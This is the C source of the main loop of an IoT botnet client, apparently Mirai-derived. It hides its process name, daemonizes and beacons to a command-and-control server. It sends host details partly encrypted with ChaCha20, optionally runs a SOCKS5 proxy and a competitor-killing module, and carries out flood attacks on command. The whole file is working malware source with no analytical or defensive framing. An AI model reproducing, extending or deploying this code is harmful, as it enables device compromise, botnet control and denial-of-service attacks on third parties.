#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>

#include "utils/headers/includes.h"
#include "encryption/chacha20_table.h"
#include "encryption/chacha20/chacha20.h"
#include "utils/headers/rand.h"
#include "modules/singleinstance/headers/tcp.h"
#include "modules/attack/attack.h"
#ifdef KILLER
#include "modules/persistence/headers/killer.h"
#endif
#ifdef LOCKER
#include "modules/persistence/headers/locker.h"
#endif
#include "modules/update/proc.h"
#include "utils/headers/util.h"
#include "utils/headers/resolver.h"
#include "modules/debug.h"
#ifdef SOCKS5
#include "modules/socks5/server.h"
#endif

static void connection_fail(void);
static void connection_create(void);
static void connection_destroy(void);
static void authentication_create(char *, char *, char *);

static void ensure_bind(uint32_t);

struct sockaddr_in srv_addr;
int esi_fd = -1, c2_fd = -1, fails = 0;
int connected = FALSE, actually_connected = FALSE;
uint32_t LOCAL_ADDR;

char *getArch()
{ // Get current architecture, detectx nearly every architecture. Coded by Freak
#if defined(__x86_64__) || defined(_M_X64)
    return "x86";
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86";
#elif defined(__ARM_ARCH_2__)
    return "arm";
#elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "arm";
#elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "arm";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "arm"
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return "arm";
#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "arm";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "arm";
#elif defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "arm";
#elif defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "arm";
#elif defined(__ARM_ARCH_7M__)
    return "arm";
#elif defined(__ARM_ARCH_7S__)
    return "arm";
#elif defined(__aarch64__)
    return "arm";
#elif defined(mips) || defined(__mips__) || defined(__mips)
    return "mips";
#elif defined(__sh__)
    return "sh4";
#elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__PPC__) || defined(_ARCH_PPC)
    return "ppc";
#elif defined(__PPC64__) || defined(__ppc64__) || defined(_ARCH_PPC64)
    return "ppc";
#elif defined(__sparc__) || defined(__sparc)
    return "spc";
#elif defined(__m68k__)
    return "m68k";
#else
    return "unk";
#endif
}

static void resolve_addr()
{
    srv_addr.sin_family = AF_INET;
#ifndef LOCAL
    int chance = rand_next_range(0, 100);
    if (chance > 30)
    {
        struct resolved *entries;
        entries = lookup_domain(enc[C2_DOMAIN_1].string);
        if (entries == NULL)
        {
            debug("Failed to resolve! Falling back to hardcoded addr.\r\n");
            srv_addr.sin_addr.s_addr = _random_cnc_addr_hardcode();
            srv_addr.sin_port = htons(C2_PORT);
            return;
        }

        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
        srv_addr.sin_port = htons(C2_PORT);

        debug("Resolved command & control address. (Found %d entries)\n", entries->addrs_len);
        free_entries(entries);
    }
    else
    {
        srv_addr.sin_addr.s_addr = _random_cnc_addr_hardcode();
        srv_addr.sin_port = htons(C2_PORT);
    }
#else
    srv_addr.sin_addr.s_addr = INET_ADDR(172, 21, 37, 155);
    srv_addr.sin_port = htons(C2_PORT);
    debug("Skipping domain resolve.\n");
#endif
}

static void connection_create(void)
{
    if ((c2_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;

    NONBLOCK(c2_fd);

    resolve_addr();

    connected = FALSE;

    if (connect(c2_fd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in)) == -1)
    {
        connection_fail();
        return;
    }
}

static void connection_destroy(void)
{
    if (c2_fd != -1)
        close(c2_fd);
    c2_fd = -1;

    connection_fail();
    actually_connected = FALSE;

    sleep(1);
}

static void connection_fail()
{
#ifdef KILLER
    fails++;
    if (fails >= 10)
    {
        killer_destroy();
    }
#endif
}

int GetTotalRAM()
{
    struct sysinfo info;
    if (sysinfo(&info) != 0)
    {
        return 0;
    }

    int totalRAM = (int)(info.totalram * info.mem_unit / (1024 * 1024));
    return totalRAM;
}

static void authentication_create(char *arch, char *version, char *identifier)
{
    char cores_tmp[16];
    char ram_tmp[16];
    char identifier_tmp[256];

    _strcpy(identifier_tmp, identifier);

    char *cores = _itoa(sysconf(_SC_NPROCESSORS_ONLN), 10, cores_tmp);
    char *ram = _itoa(GetTotalRAM(), 10, ram_tmp);

    uint8_t identifier_len = identifier ? _strlen(identifier) : 0;
    uint8_t arch_len = _strlen(arch);
    uint8_t version_len = _strlen(version);
    uint8_t cores_len = _strlen(cores);
    uint8_t ram_len = _strlen(ram);

    send(c2_fd, "\x00\x00\x00\x04", 4, MSG_NOSIGNAL);

    // only unencrypted values
    send(c2_fd, &arch_len, sizeof(arch_len), MSG_NOSIGNAL);
    send(c2_fd, arch, arch_len, MSG_NOSIGNAL);

    send(c2_fd, &version_len, sizeof(version_len), MSG_NOSIGNAL);
    send(c2_fd, version, version_len, MSG_NOSIGNAL);

    // encryption start lol
    chacha20_xor(key, 1, nonce, cores, cores, cores_len);
    send(c2_fd, &cores_len, sizeof(cores_len), MSG_NOSIGNAL);
    send(c2_fd, cores, cores_len, MSG_NOSIGNAL);

    chacha20_xor(key, 1, nonce, ram, ram, ram_len);
    send(c2_fd, &ram_len, sizeof(ram_len), MSG_NOSIGNAL);
    send(c2_fd, ram, ram_len, MSG_NOSIGNAL);

    send(c2_fd, &identifier_len, sizeof(identifier_len), MSG_NOSIGNAL);

    if (identifier_len > 0)
    {
        chacha20_xor(key, 1, nonce, identifier_tmp, identifier_tmp, identifier_len);
        send(c2_fd, identifier_tmp, identifier_len, MSG_NOSIGNAL);
    }

    fails = 0;
    connected = 1;
    debug("Connected to the command & control server!\r\n");
}

static void ensure_bind(uint32_t local_addr)
{
    struct sockaddr_in addr;

    int ret = 0;
    int e = 0;

    esi_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (esi_fd == -1)
        exit(0);

    NONBLOCK(esi_fd);
    REUSE_ADDR(esi_fd);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ENSURE_PORT);
    addr.sin_addr.s_addr = local_addr;

    errno = 0;

    ret = bind(esi_fd, (struct sockaddr *)&addr, sizeof(addr));
    e = errno;

    if (ret == -1)
        connect(esi_fd, (struct sockaddr *)&addr, sizeof(addr));

    if (ret == -1 && e == EADDRNOTAVAIL)
    {
        close(esi_fd);
        sleep(1);
        ensure_bind(LOCAL_ADDR);
        return;
    }

    if (ret == -1 && e == EADDRINUSE)
    {
        close(esi_fd);
        sleep(3);
        kill_port(htons(ENSURE_PORT));
        ensure_bind(LOCALHOST);
        return;
    }

    listen(esi_fd, 1);
    return;
}

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char identifier[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    chdir("/");
#endif

    LOCAL_ADDR = _local_addr();

    xor_init();

    _zero(identifier, 32);
    if (argc == 2 && _strlen(args[1]) < 32)
    {
        _strcpy(identifier, args[1]);
        _zero(args[1], _strlen(args[1]));
    }
    else
    {
        _strcpy(identifier, "undefined");
    }

    ensure_bind(LOCALHOST);

    rand_init();

    /* lalalala */
    _strcpy(args[0], enc[PROC_NAME].string);
    prctl(PR_SET_NAME, enc[PROC_NAME].string);

    // Print out system exec
    write(STDOUT, enc[EXECUTE_MESSAGE].string, enc[EXECUTE_MESSAGE].len);
    write(STDOUT, "\n", 1);

    signal(SIGCHLD, SIG_IGN);

    struct sockaddr_in addr;

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    floods_init();

#ifdef KILLER
    killer_create();
#endif

#ifdef SOCKS5
    kill_port(htons(26721));
    int sock5_pid = fork();
    if (sock5_pid == 0)
    {
        socks5_server("0.0.0.0", 26721, enc[SOCKS5_USER].string, enc[SOCKS5_PASS].string, 1);
        return;
    }
#endif

    while (TRUE)
    {
        fd_set read_set, write_set;
        struct timeval timeout;
        int max_fds, ret;

        FD_ZERO(&read_set);
        FD_ZERO(&write_set);

        if (esi_fd != -1)
            FD_SET(esi_fd, &read_set);

        if (c2_fd == -1)
            connection_create();

        FD_SET(c2_fd, (connected ? &read_set : &write_set));

        max_fds = (esi_fd > c2_fd ? esi_fd : c2_fd);

        timeout.tv_usec = 0;
        timeout.tv_sec = 15;

        ret = select(max_fds + 1, &read_set, &write_set, NULL, &timeout);
        if (ret == -1)
            continue;

        if (ret == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(c2_fd, &len, sizeof(len), MSG_NOSIGNAL);
        }

        /* Accept ESI proc kill request */
        if (FD_ISSET(esi_fd, &read_set) && esi_fd != -1)
        {
            int tmp = -1;
            struct sockaddr_in taddr;
            socklen_t taddr_len = sizeof(taddr);

            debug("Process kill request accepted, killing our own malware.\n");

            tmp = accept(esi_fd, (struct sockaddr *)&taddr, &taddr_len); // Accept the connection

            close(tmp);
            close(esi_fd);

#ifdef KILLER
            killer_destroy();
#endif

#ifdef SOCKS5
            kill(sock5_pid, SIGKILL);
#endif
            kill(pgid * -1, SIGKILL);
            exit(0);
        }

        if (FD_ISSET(c2_fd, &write_set))
        {
            int err = 0;
            socklen_t err_len = sizeof(err);

            int n = getsockopt(c2_fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
            if (err != 0 || n != 0)
                connection_destroy();
            else
                authentication_create(getArch(), enc[MALWARE_VERSION].string, identifier);
        }

        if (!connected)
        {
            debug("Failed to connect to the command & control server.\n");
            connection_destroy();
            continue;
        }

        if (FD_ISSET(c2_fd, &read_set))
        {
            uint16_t len;
            char rdbuf[8192];

            errno = 0;
            ret = recv(c2_fd, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if (ret == -1)
            {
                // Determine if the resource was temporarily unavailable before we conclude a definite error
                if (errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)
                {
                    debug("Disconnected from the command & control server?\n");
                    continue;
                }
                ret = 0;
            }

            if (ret == 0)
            {
                debug("Disconnected from the command & control server.\n");
                connection_destroy();
                actually_connected = FALSE;
                continue;
            }

            // We don't need to read a ping buffer
            if (len == 0)
            {
                recv(c2_fd, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }

            // We read the buffer length
            len = ntohs(len);
            if (len > sizeof(rdbuf))
            {
                connection_destroy();
            }

            errno = 0;
            ret = recv(c2_fd, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (ret == -1)
            {
                // Determine if the resource was temporarily unavailable before we conclude a definite error
                if (errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)
                {
                    debug("Disconnected from the command & control server?\n");
                    continue;
                }
                ret = 0;
            }

            if (ret == 0)
            {
                connection_destroy();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(c2_fd, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(c2_fd, rdbuf, len, MSG_NOSIGNAL);

            // chacha20_xor(key, 1, nonce, rdbuf, rdbuf, len);

            if (len > 0)
            {
                flood_parse(rdbuf, len);
            }
        }
    }

    return 0;
}